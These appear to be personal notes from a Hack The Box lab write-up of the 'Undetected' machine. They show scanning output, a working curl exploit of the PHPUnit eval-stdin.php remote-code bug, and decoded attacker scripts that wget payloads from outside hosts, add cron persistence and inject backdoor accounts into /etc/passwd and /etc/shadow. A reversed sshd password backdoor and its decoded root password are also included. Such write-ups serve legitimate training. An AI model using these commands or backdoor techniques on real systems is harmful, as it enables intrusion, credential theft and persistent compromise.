# scanning
* `TCP` Scan
TARGET=10.10.11.146 && nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap


PORT   STATE SERVICE REASON         VERSION
## 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2 (protocol 2.0)

## 80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Diana's Jewelry
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS


# dirsearch
> dirsearch -u http://10.10.11.146 -f -x 500,401,403
[13:47:01] 301 -  309B  - /js  ->  http://10.10.11.146/js/
[13:48:39] 301 -  310B  - /css  ->  http://10.10.11.146/css/
[13:48:52] 301 -  312B  - /fonts  ->  http://10.10.11.146/fonts/
[13:48:57] 301 -  312B  - /icons  ->  http://10.10.11.146/icons/
[13:48:58] 301 -  313B  - /images  ->  http://10.10.11.146/images/
[13:49:00] 200 -   15KB - /index.html

[14:01:17] 301 -  309B  - /js  ->  http://djewelry.htb/js/
[14:03:14] 200 -    2KB - /css/
[14:03:14] 301 -  310B  - /css  ->  http://djewelry.htb/css/
[14:03:29] 301 -  312B  - /fonts  ->  http://djewelry.htb/fonts/
[14:03:29] 200 -    7KB - /fonts/
[14:03:35] 301 -  312B  - /icons  ->  http://djewelry.htb/icons/
[14:03:36] 301 -  313B  - /images  ->  http://djewelry.htb/images/
[14:03:36] 200 -    5KB - /images/
[14:03:38] 200 -   15KB - /index.html
[14:03:43] 200 -    2KB - /js/

[14:05:09] 301 -  321B  - /js  ->  http://store.djewelry.htb/js/
[14:06:38] 200 -    4KB - /cart.php
[14:06:48] 200 -    2KB - /css/
[14:06:48] 301 -  322B  - /css  ->  http://store.djewelry.htb/css/
[14:07:02] 301 -  324B  - /fonts  ->  http://store.djewelry.htb/fonts/
[14:07:02] 200 -    7KB - /fonts/
[14:07:08] 301 -  325B  - /images  ->  http://store.djewelry.htb/images/
[14:07:08] 200 -   12KB - /images/
[14:07:09] 200 -    6KB - /index.php
[14:07:09] 200 -    6KB - /index.php/
[14:07:09] 200 -    6KB - /index.php/login/
[14:07:13] 200 -    3KB - /js/
[14:07:18] 200 -    4KB - /login.php
[14:07:18] 200 -    4KB - /login.php/
[14:07:42] 200 -    7KB - /products.php
[14:08:05] 200 -    3KB - /vendor/
[14:08:05] 200 -    0B  - /vendor/autoload.php/
[14:08:05] 200 -    0B  - /vendor/autoload.php
[14:08:05] 200 -    0B  - /vendor/composer/autoload_classmap.php/
[14:08:05] 200 -    0B  - /vendor/composer/autoload_classmap.php
[14:08:05] 200 -    0B  - /vendor/composer/autoload_files.php
[14:08:05] 200 -    0B  - /vendor/composer/autoload_namespaces.php/
[14:08:05] 200 -    0B  - /vendor/composer/autoload_namespaces.php
[14:08:05] 200 -    0B  - /vendor/composer/autoload_psr4.php/
[14:08:05] 200 -    0B  - /vendor/composer/autoload_files.php/
[14:08:05] 200 -    0B  - /vendor/composer/autoload_real.php
[14:08:05] 200 -    0B  - /vendor/composer/autoload_psr4.php
[14:08:05] 200 -    0B  - /vendor/composer/ClassLoader.php/
[14:08:05] 200 -    0B  - /vendor/composer/ClassLoader.php
[14:08:05] 200 -    0B  - /vendor/composer/autoload_real.php/
[14:08:05] 200 -    0B  - /vendor/composer/autoload_static.php/
[14:08:05] 200 -    1KB - /vendor/composer/LICENSE
[14:08:05] 200 -    0B  - /vendor/composer/autoload_static.php
[14:08:05] 200 -    0B  - /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php/
[14:08:05] 200 -    0B  - /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
[14:08:05] 200 -   46KB - /vendor/composer/installed.json


https://store.djewelry.htb/

> wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://djewelry.htb/" -H "Host: FUZZ.djewelry.htb" --hl 277

000000081:   200        195 L    475 W      6203 Ch     "store" 

contact@djewelry.htb

http://store.djewelry.htb/vendor/phpunit/phpunit/

https://github.com/vulhub/vulhub/blob/master/phpunit/CVE-2017-9841/README.md

curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data "<?php system('whoami')?>";

curl http://store.djewelry.htb/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php --data "<?php system('cat ../../../../../../../../backups/info')?>" --output info

776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b

> echo 776765742074656d7066696c65732e78797a2f617574686f72697a65645f6b657973202d4f202f726f6f742f2e7373682f617574686f72697a65645f6b6579733b20776765742074656d7066696c65732e78797a2f2e6d61696e202d4f202f7661722f6c69622f2e6d61696e3b2063686d6f6420373535202f7661722f6c69622f2e6d61696e3b206563686f20222a2033202a202a202a20726f6f74202f7661722f6c69622f2e6d61696e22203e3e202f6574632f63726f6e7461623b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122313a5c24365c247a5337796b4866464d673361596874345c2431495572685a616e5275445a6866316f49646e6f4f76586f6f6c4b6d6c77626b656742586b2e567447673738654c3757424d364f724e7447625a784b427450753855666d39684d30522f424c6441436f513054396e2f3a31383831333a303a39393939393a373a3a3a203e3e202f6574632f736861646f7722297d27202f6574632f7061737377643b2061776b202d46223a2220272437203d3d20222f62696e2f6261736822202626202433203e3d2031303030207b73797374656d28226563686f2022243122202224332220222436222022243722203e2075736572732e74787422297d27202f6574632f7061737377643b207768696c652072656164202d7220757365722067726f757020686f6d65207368656c6c205f3b20646f206563686f202224757365722231223a783a2467726f75703a2467726f75703a2c2c2c3a24686f6d653a247368656c6c22203e3e202f6574632f7061737377643b20646f6e65203c2075736572732e7478743b20726d2075736572732e7478743b | xxd -r -p

```
wget tempfiles.xyz/authorized_keys -O /root/.ssh/authorized_keys; wget tempfiles.xyz/.main -O /var/lib/.main; chmod 755 /var/lib/.main; echo "* 3 * * * root /var/lib/.main" >> /etc/crontab; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1"1:\$6\$zS7ykHfFMg3aYht4\$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7::: >> /etc/shadow")}' /etc/passwd; awk -F":" '$7 == "/bin/bash" && $3 >= 1000 {system("echo "$1" "$3" "$6" "$7" > users.txt")}' /etc/passwd; while read -r user group home shell _; do echo "$user"1":x:$group:$group:,,,:$home:$shell" >> /etc/passwd; done < users.txt; rm users.txt;


$11:$6$zS7ykHfFMg3aYht4$1IUrhZanRuDZhf1oIdnoOvXoolKmlwbkegBXk.VtGg78eL7WBM6OrNtGbZxKBtPu8Ufm9hM0R/BLdACoQ0T9n/:18813:0:99999:7:::
```
* check /etc/passwd, there is a steven1 user

`steven1:ihatehackers`

steven@production:~$ cat user.txt 


# pe
> cat /var/mail/steven 
```
From root@production  Sun, 25 Jul 2021 10:31:12 GMT
Return-Path: <root@production>
Received: from production (localhost [127.0.0.1])
	by production (8.15.2/8.15.2/Debian-18) with ESMTP id 80FAcdZ171847
	for <steven@production>; Sun, 25 Jul 2021 10:31:12 GMT
Received: (from root@localhost)
	by production (8.15.2/8.15.2/Submit) id 80FAcdZ171847;
	Sun, 25 Jul 2021 10:31:12 GMT
Date: Sun, 25 Jul 2021 10:31:12 GMT
Message-Id: <202107251031.80FAcdZ171847@production>
To: steven@production
From: root@production
Subject: Investigations

Hi Steven.

We recently updated the system but are still experiencing some strange behaviour with the Apache service.
We have temporarily moved the web store and database to another server whilst investigations are underway.
If for any reason you need access to the database or web application code, get in touch with Mark and he
will generate a temporary password for you to authenticate to the temporary server.

Thanks,
sysadmin
```

* sort with latest update
> steven@production:/usr/lib/apache2/modules$ ls -ltrh
-rw-r--r-- 1 root root  34K May 17  2021 mod_reader.so

> strings mod_reader.so
echo d2dldCBzaGFyZWZpbGVzLnh5ei9pbWFnZS5qcGVnIC1PIC91c3Ivc2Jpbi9zc2hkOyB0b3VjaCAtZCBgZGF0ZSArJVktJW0tJWQgLXIgL3Vzci9zYmluL2EyZW5tb2RgIC91c3Ivc2Jpbi9zc2hk | base64 -d
```
wget sharefiles.xyz/image.jpeg -O /usr/sbin/sshd; touch -d `date +%Y-%m-%d -r /usr/sbin/a2enmod` /usr/sbin/sshd
```


# reverse eng
```c++
int auth_password(ssh *ssh,char *password)

{
  Authctxt *ctxt;
  passwd *ppVar1;
  int iVar2;
  uint uVar3;
  byte *pbVar4;
  byte *pbVar5;
  size_t sVar6;
  byte bVar7;
  int iVar8;
  long in_FS_OFFSET;
  char backdoor [31];
  byte local_39 [9];
  long local_30;
  
  bVar7 = 0xd6;
  ctxt = (Authctxt *)ssh->authctxt;
  local_30 = *(long *)(in_FS_OFFSET + 0x28);
  backdoor._28_2_ = 0xa9f4;
  ppVar1 = ctxt->pw;
  iVar8 = ctxt->valid;
  backdoor._24_4_ = 0xbcf0b5e3;
  backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
  backdoor[30] = -0x5b;
  backdoor._0_4_ = 0xf0e7abd6;
  backdoor._4_4_ = 0xa4b3a3f3;
  backdoor._8_4_ = 0xf7bbfdc8;
  backdoor._12_4_ = 0xfdb3d6e7;
  pbVar4 = (byte *)backdoor;
  while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }
  iVar2 = strcmp(password,backdoor);
  uVar3 = 1;
  if (iVar2 != 0) {
    sVar6 = strlen(password);
    uVar3 = 0;
    if (sVar6 < 0x401) {
      if ((ppVar1->pw_uid == 0) && (options.permit_root_login != 3)) {
        iVar8 = 0;
      }
      if ((*password != '\0') ||
         (uVar3 = options.permit_empty_passwd, options.permit_empty_passwd != 0)) {
        if (auth_password::expire_checked == 0) {
          auth_password::expire_checked = 1;
          iVar2 = auth_shadow_pwexpired(ctxt);
          if (iVar2 != 0) {
            ctxt->force_pwchange = 1;
          }
        }
        iVar2 = sys_auth_passwd(ssh,password);
        if (ctxt->force_pwchange != 0) {
          auth_restrict_session(ssh);
        }
        uVar3 = (uint)(iVar2 != 0 && iVar8 != 0);
      }
    }
  }
  if (local_30 == *(long *)(in_FS_OFFSET + 0x28)) {
    return uVar3;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}


// xor applied
while( true ) {
    pbVar5 = pbVar4 + 1;
    *pbVar4 = bVar7 ^ 0x96;
    if (pbVar5 == local_39) break;
    bVar7 = *pbVar5;
    pbVar4 = pbVar5;
  }

// key is 0x96

backdoor[30] = 0xa5; // changed, was -0x5b;
backdoor._28_2_ = 0xa9f4;
backdoor._24_4_ = 0xbcf0b5e3;
backdoor._16_8_ = 0xb2d6f4a0fda0b3d6;
backdoor._12_4_ = 0xfdb3d6e7;
backdoor._8_4_ = 0xf7bbfdc8;
backdoor._4_4_ = 0xa4b3a3f3;
backdoor._0_4_ = 0xf0e7abd6;
```

```
a5a9f4bcf0b5e3b2d6f4a0fda0b3d6fdb3d6e7f7bbfdc8a4b3a3f3f0e7abd6
```

* cyberchef recipe
* https://gchq.github.io/CyberChef/#recipe=Swap_endianness('Hex',31,false)From_Hex('Space')XOR(%7B'option':'Hex','string':'96'%7D,'Standard',false)&input=MHhhNQoweGE5ZjQKMHhiY2YwYjVlMwoweGIyZDZmNGEwZmRhMGIzZDYKMHhmZGIzZDZlNwoweGY3YmJmZGM4CjB4YTRiM2EzZjMKMHhmMGU3YWJkNg

`@=qfe5%2^k-aq@%k@%6k6b@$u#f*b?3`

root@kali:~/workspace/htb-Undetected# ssh root@10.10.11.146
root@10.10.11.146's password: 
Last login: Tue Feb  8 20:11:45 2022 from 10.10.14.23
root@production:~# cd 
root@production:~# ls
root.txt
root@production:~# cat root.txt 
root@production:~# 



# ref
https://0xdedinfosec.vercel.app/posts/hackthebox-undetected-writeup
https://zhuanlan.zhihu.com/p/472635771
